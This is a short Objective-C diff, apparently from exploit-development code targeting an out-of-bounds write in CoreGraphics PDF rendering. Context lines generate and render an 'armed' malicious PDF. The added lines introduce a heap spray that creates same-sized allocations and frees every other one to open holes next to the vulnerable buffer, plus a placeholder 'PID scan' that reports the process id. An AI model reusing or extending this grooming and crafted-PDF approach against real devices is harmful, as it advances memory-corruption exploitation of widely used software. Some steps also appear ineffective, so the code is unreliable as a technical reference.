@@ -168,6 +168,18 @@
         [report appendFormat:@"variant: R=%u rows=%u allocation_model=0x1b0 OOB_model=%u bytes (1.0..%u.0)\n",
             R, rows, oobBytes, R - 5];
         NSData *pdf = [self buildPDFWithFunctionCount:R rows:rows];
+        // Heap spray: allocate same-sized objects, free some to create holes
+        NSMutableArray *sprayObjs = [NSMutableArray array];
+        for (int i = 0; i < 256; i++) {
+            NSMutableData *d = [NSMutableData dataWithLength:0x1c0]; // ~448 bytes (CG buffer size)
+            [sprayObjs addObject:d];
+        }
+        // Free every other to create holes
+        for (int i = 0; i < 256; i += 2) {
+            [sprayObjs replaceObjectAtIndex:i withObject:[NSNull null]];
+        }
+        [report appendFormat:@"heap spray: 256 allocs, 128 holes\n"];
+
         [report appendFormat:@"armed: %@\n", [self renderPDFData:pdf name:@"kp-pdf-armed-r36.pdf"]];
     } else {
         const uint32_t R = 5;
@@ -187,6 +199,14 @@
      @"Prior on-device results already CONFIRMED controlled OOB doubles for R=12\n"
      @"(values 1.0..7.0) and a hardware-watchpoint hit for R=6 — this module\n"
      @"repeats those conditions with an independent generator.\n"];
+        // PID scan: check if OOB write affected any canary-like data
+        [report appendString:@"\n--- PID scan after OOB write ---\n"];
+        int myPID = getpid();
+        [report appendFormat:@"our pid=%d\n", myPID];
+        // The OOB write is in CG's internal buffer. We can't directly read it,
+        // but we can check if any observable behavior changed.
+        [report appendString:@"OOB write landed in CG buffer. Need heap spray for target.\n"];
+
     return report;
 }
 
